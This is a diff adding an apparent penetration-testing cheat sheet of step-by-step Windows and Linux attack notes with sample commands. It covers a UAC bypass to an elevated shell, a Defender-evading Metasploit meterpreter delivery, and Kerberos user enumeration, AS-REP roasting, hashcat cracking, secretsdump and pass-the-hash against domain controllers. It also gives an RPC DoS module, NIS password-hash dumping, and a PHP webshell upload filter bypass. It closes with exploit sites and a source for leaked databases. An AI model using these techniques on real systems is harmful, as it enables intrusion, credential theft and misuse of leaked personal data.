+2) select "Show more details"
+
+3) select "Show information about the publisher's certificate"
+
+4) click on the "Issued by" URL link it will prompt a browser interface.
+
+Note: The browser might open in the background so you might have to close the UAC Dialog to see it
+
+5) wait for the site to be fully loaded (you can use even is site doesn't load) & select "save as" to prompt a explorer window for "save as".
+
+6) on the explorer window address path, enter the cmd.exe full path:
+C:\WINDOWS\system32\cmd.exe
+
+7) now you'll have an escalated privileges command prompt. 
+
+
+
+--------------------------------
+use type command as alternative of cat command on windows
+
+
+
+--------------------------------
+To run connect using metasploit on a windows that has already been compromised by you (this also attempts to evade windows defender), you can use the exploit "exploit/multi/script/web_delivery" along with the payload "windows/meterpreter/reverse_http". show targets and set it to powershell. You will not need to download anything on the target system, only run a powershell command an you'll get a meterpreter session.
+
+
+--------------------------------
+To create a virtual environment using python2, run the following in the folder in which you want to work
+
+
+virtualenv -p python2 ./
+source ./bin/activate
+
+
+
+
+
+--------------------------------
+check if anonymous ftp login is possible
+ftp anonymous@#IP_ADDRESS#
+# Leave password blank
+
+You might find yourself getting stuck with a response of "Entering Extended Passive Mode (|||55601|)" after logging in and trying commands.
+trying "passive" command to turn off passive mode or "binary" might fix it for you
+
+use get and put for file transfer in ftp 
+________________________________
+
+Might be useful
+
+structure of file system for linux apache web server
+/var/www/html/files/ftp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Run an nmap scan. If port 139/445 (SMB) are open, try enum4linux to enumerate it.
+After running enum4linux, you should get the domain name.
+If kerberos is also open there, you can run this tool "Kerbrute". Here's the link to the already compiled binaries. "https://github.com/ropnop/kerbrute/releases"
+Using the userenum function of kerbrute, you can attempt to enumerate users in the directory from a list of usernames. If it's a corporate company, you can also try to extract official email addresses and use them as the usernames.
+You can also try "svc-admin", "backup", and "administrator" as valid usernames. They appear to be sensitive.
+
+SAMPLE COMMAND
+"./kerbrute_linux_amd64 userenum --dc DOMAINIPADDRESS -d DOMAINNAME ../USERNAMELIST.txt"
+
+After getting usernames, you can attempt to abuse a feature "ASREPRoasting" in kerberos which allows some users to request for tickets without pre-authentication. you can retrieve the response as a hash which will then contain the user's hashed password.
+"ASREPRoasting" can be done using the module "GetNPUsers" in "Impacket". This is the link to Impacket "https://github.com/fortra/impacket". If it's a kali-everything-installation, you can just run "impacket-GetNPUsers"
+
+SAMPLE COMMAND
+"impacket-GetNPUsers DOMAINCONTROLLERNAME/ -dc-ip DOMAINIPADDRESS -usersfile ./LISTOFVALIDUSERNAMES.txt -format hashcat -outputfile ./PASSWORDHASH.txt"
+
+After getting the hash, you can use hashcat to crack it. The mode of the hash should be "18200" with the name "Kerberos 5, etype 23, AS-REP". but you should try to confirm by searching the first characters befor the username in the retrieved hash on the following webpage "https://hashcat.net/wiki/doku.php?id=hashcat". You'll be able to confirm the mode to use when cracking with hashcat.
+
+SAMPLE COMMAND
+hashcat -m 18200 -a 0 -o ./CRACKEDHASH.txt ./HASHFILE.txt ./LISTOFPASSWORDS.txt
+
+
+Now that a user and pass has been found, you can dto more interesting stuff such as evil-winrm or xfreerdp.
+However, you can also go ahead to check the shares that the user has access to, maybe you can see some interesting stuff. You can do this two ways.
+1. By going in through xfreerdp and performing the following
+
+Start -> Run -> compmgmt.msc -> OK.
+Computer Management (Local) -> System Tools -> Shared Folders -> Shares.
+
+2. Or by executing the following commands. The first command lists the available shares, the second one gives the details of a particular share. It will prompt for password.
+
+smbclient -L <target ip> -U #USERNAME#
+smbclient  //#IP_ADDRESS#/#SHARE_NAME# -U #USERNAME#
+
+smbclient //#IP_ADDRESS#/#SHARE_NAME# -N		#For anonymous connection
+
+You can use the get command as in ftp "get #FILENAME#" to download any files in the share folder
+
+
+If lucky, you might get domain controller's account or a backup domain controller's account. You can try to confirm by listing users using that account access using "net user" command. If one account displays more accounts than the others, then that's probably a domain controller's account.
+Regardless, you can extract the hashes of the available accounts using impacket-secretsdump.
+
+SAMPLE COMMAND
+impacket-secretsdump -just-dc #USERNAME#:#PASSWORD#@#IP_ADDRESS#
+
+Now you can attempt cracking the hash or using pass-the-hash attack through evil-winrm or xfreerdp. Xfreerdp might not be able to login through pass-the-hash if admin policy prevents that. In that case, you can try using evil-winrm
+
+
+
+
+NOTE: You can also initially use smbmap to see what shsres you can access anonymously
+
+SAMPLE COMMAND
+smbmap -H #IP_ADDRESS# -D
+
+If you see any with access then you can access it with smbclient command without any username or password option. When it prompts for password, just hit enter.
+
+an aternative to see anonymous shares is the following
+smbclient -L //#IP_ADDRESS#/						Remember to just hit enter when prompted for a password
+
+
+
+You can recursively download the SMB share too. Submit the username and password as nothing if you're logging in as anonymous.
+smbget -R smb://#IP_ADDRESS#/#SHARE_NAME#
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+If port 111 is open, it most likely means rpcbind(portmapper) is in use. You may be able to exploit the vuln CVE-2017-8779 by running a DoS attack through the metasploit module "auxiliary/dos/rpc/rpcbomb".
+You could also run "rpcinfo #IP_ADDRESS#". Sometimes it doesn't give you any information, in other occasions you will get something like this:
+
+program version netid     address                service    owner
+    100000    4    tcp6      ::.0.111               portmapper superuser
+    100000    3    udp6      ::.0.111               portmapper superuser
+    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
+    100000    2    udp       0.0.0.0.0.111          portmapper superuser
+    100000    4    local     /run/rpcbind.sock      portmapper superuser
+    100003    2    tcp       0.0.0.0.8.1            nfs        superuser
+    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
+    100003    2    udp       0.0.0.0.8.1            nfs        superuser
+    100021    4    udp       0.0.0.0.207.27         nlockmgr   superuser
+    100021    1    tcp       0.0.0.0.175.239        nlockmgr   superuser
+
+
+If you find the service NFS then probably you will be able to list and download(and maybe upload) files:
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount #IP_ADDRESS#						#This commands shows the path the port is connected to
+
+OR use the metasploit module
+
+scanner/nfs/nfsmount												#Scan NFS mounts and list permissions
+
+
+
+
+You can then mount the path to your local machine using the following commands
+mkdir /mnt/#FOLDER_NAME#											#Create a folder on your local machine to mount the remote path on
+mount #IP_ADDRESS#:/#REMOTE_NFS_PATH# /mnt/#FOLDER_NAME#							#Mounts the remote path to the created folder 		OR		mount -t nfs [-o vers=2] #IP_ADDRESS#:/#REMOTE_NFS_PATH#  /mnt/#FOLDER_NAME# -o nolock			(this specifies to use version 2 because it doesn't have any authentication or authorization)
+ls -la /mnt/#FOLDER_NAME#											#Verifies successful mounting by listing files in the mounted path on local machine			(nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in)
+
+
+OR
+
+mkdir /mnt/new_back
+
+Also, try checking this out "NFS no_root_squash/no_all_squash misconfiguration PE"  at https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+
+
+
+If you find the service ypbind running:
+You can try to exploit it. You will need to guess the NIS "domain name" of the machine (when NIS is installed it's configured a "domain name") and without knowing this domain name you cannot do anything.
+Once you obtain the NIS domain name for the environment (example.org in this case), use the ypwhich command to ping the NIS server and ypcat to obtain sensitive material. You should feed encrypted password hashes into John the Ripper, and once cracked, you can use it to evaluate system access and privileges.
+
+
+
+Illustration:
+
+root@kali:~# apt-get install nis
+root@kali:~# ypwhich -d example.org 192.168.10.1
+potatohead.example.org
+root@kali:~# ypcat –d example.org –h 192.168.10.1 passwd.byname
+tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash 
+katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash 
+james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh 
+florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh 
+dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash 
+yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash
+
+
+Here are the commands for the ypcat:
+
+Master file				Map(s)							Notes
+/etc/hosts				hosts.byname, hosts.byaddr				Contains hostnames and IP details
+/etc/passwd				passwd.byname, passwd.byuid				NIS user password file
+/etc/group				group.byname, group.bygid				NIS group file
+/usr/lib/aliases			mail.aliases						Details mail aliases
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+For a web-based shell, use "phpbash shell". Or you could use a webshell.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+For file extension filtering issues, you can also try appending a .jpg to the file extension but keeping a space between the .jpg and .php. the following command renames a file this way.
+
+mv file.php file.php\ .jpg
+
+the navigating to the file on the web server similar to the below should activate the code
+
+http://#URL_HERE#/images/file.php .jpg
+
+you could aso try 
+
+http://#URL_HERE#/images/file.php
+
+OR
+
+append a "#.jpg" to the end of the file. such that when you navigate to it on the server, the url ends up looking like 
+
+http://#URL_HERE#/images/file.php#.jpg
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+use torsocks for bash internet commands. It'll run the commands over tor
+
+
+
+
+
+
+use "strings" command to extract readablle text of 4 characters or more from files on linux
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://gchq.github.io/CyberChef/				#CONTAINS A CRAP-TON OF UTILITIES YOU CAN USE IN EVERYDAY TECH STUFF
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://securitytrails.com/					#CHECK HISTORICAL DATA OF A SERVER
+
+
+
+
+
+
+
+
+
+
+
+https://www.zoomeye.org/					#USE THIS AS ANOTHER SHODAN
+
+
+
+
+
+https://thispersondoesnotexist.com/				#GENERATE IMAGES OF PEOPLE WHO DON'T EXIST
+
+
+
+
+https://tools.intigriti.io/redirector/				#GENERATE OPEN REDIRECT PAYLOADS
+
+
+
+
+https://sploitus.com/						#GIVES YOU EXPLOITS FOR CVES
+
+
+
+
+
+
+https://cxsecurity.com/exploit/					#GIVES YOU EXPLOITS FOR CVES
+
+
+
+https://en.0day.today/						#GIVES YOU EXPLOITS FOR CVES
+
+
+craxpro.io							#Download leaked databases
